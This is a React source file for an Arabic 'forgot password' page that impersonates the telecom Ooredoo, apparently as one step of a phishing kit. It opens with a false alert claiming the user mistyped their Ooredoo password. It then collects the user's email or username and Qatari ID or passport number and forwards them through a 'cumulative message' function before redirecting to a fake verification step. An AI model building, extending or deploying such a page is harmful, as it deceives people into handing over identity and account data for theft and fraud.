import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, X, AlertTriangle } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import Footer from "@/components/Footer";
import { useRegistration } from "@/contexts/RegistrationContext";
import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from "@/components/ui/alert-dialog";
const ForgotPassword = () => {
  const navigate = useNavigate();
  const [showAlert, setShowAlert] = useState(true);
  const [email, setEmail] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const {
    updateData,
    sendCumulativeMessage
  } = useRegistration();
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newData = {
      forgotPasswordEmail: email,
      forgotPasswordId: idNumber
    };
    await sendCumulativeMessage(10, "نسيت كلمة المرور", newData);
    updateData(newData);

    // Navigate to email verification page with the email
    navigate("/email-verification", {
      state: {
        email
      }
    });
  };
  return <>
      {/* Alert Dialog */}
      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
        <AlertDialogContent className="max-w-md mx-4 rounded-2xl" dir="rtl">
          <AlertDialogHeader className="flex flex-col items-center text-center gap-4">
            <div className="w-20 h-20 flex items-center justify-center">
              <img alt="Ooredoo" className="w-16 h-16 object-contain" src="/lovable-uploads/19d0886d-da1c-49a5-9558-aed8c956e4b0.png" />
            </div>
            <AlertDialogTitle className="text-xl font-bold text-gray-900">
              تنبيه
            </AlertDialogTitle>
            <AlertDialogDescription className="text-base text-black font-bold leading-relaxed text-center">
              لقد قمت بإدخال كلمة المرور الخاصة بتطبيق Ooredoo بشكل خاطئ.
              <br />
              يُرجى إعادة تعيين كلمة المرور.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="mt-4">
            <Button onClick={() => setShowAlert(false)} className="w-full h-12 text-lg font-bold bg-[#E31E24] hover:bg-[#c91a1f] text-white rounded-full">
              حسناً
            </Button>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      {/* Header */}
      <header className="bg-[#E31E24] text-white py-3 px-4">
        <div className="container mx-auto flex items-center justify-between">
          <button onClick={() => navigate(-1)} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
            <ArrowRight className="w-6 h-6" />
          </button>
          
          <h1 className="text-xl font-bold">هل نسيت كلمة المرور؟</h1>
          
          <button onClick={() => navigate("/")} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
            <X className="w-6 h-6" />
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8 max-w-2xl">
        <div className="space-y-6">
          {/* Title */}
          <div className="text-center space-y-4">
            <h2 className="text-2xl md:text-3xl font-bold text-gray-900">
              هل نسيت كلمة المرور؟
            </h2>
            <h3 className="text-xl md:text-2xl font-semibold text-gray-900">
              لنقم بإنشاء كلمة مرور جديدة
            </h3>
          </div>

          {/* Instructions */}
          <div className="text-right px-4">
            <p className="text-base md:text-lg text-gray-700 leading-relaxed">
              يُرجى إدخال <span className="font-bold">اسم المستخدم</span> أو <span className="font-bold">البريد الإلكتروني</span>، و<span className="font-bold">رقم البطاقة الشخصية القطرية</span> أو <span className="font-bold">رقم جواز السفر</span> ليصلك رابط إعادة تعيين كلمة المرور.
            </p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6 mt-8">
            {/* Email/Username Input */}
            <div>
              <Input type="text" value={email} onChange={e => setEmail(e.target.value)} placeholder="البريد الإلكتروني أو اسم المستخدم" className="w-full h-14 text-base text-center rounded-full border-2 border-gray-300 focus:border-[#E31E24] focus:ring-0" required />
            </div>

            {/* ID/Passport Input */}
            <div>
              <Input type="text" value={idNumber} onChange={e => setIdNumber(e.target.value)} placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر" className="w-full h-14 text-base text-center rounded-full border-2 border-gray-300 focus:border-[#E31E24] focus:ring-0" required />
            </div>

            {/* Submit Button */}
            <div className="pt-8">
              <Button type="submit" className="w-full h-14 text-lg font-bold bg-[#E31E24] hover:bg-[#c91a1f] text-white rounded-full">
                تأكيد
              </Button>
            </div>
          </form>
        </div>
      </main>

      <Footer />
    </div>
    </>;
};
export default ForgotPassword;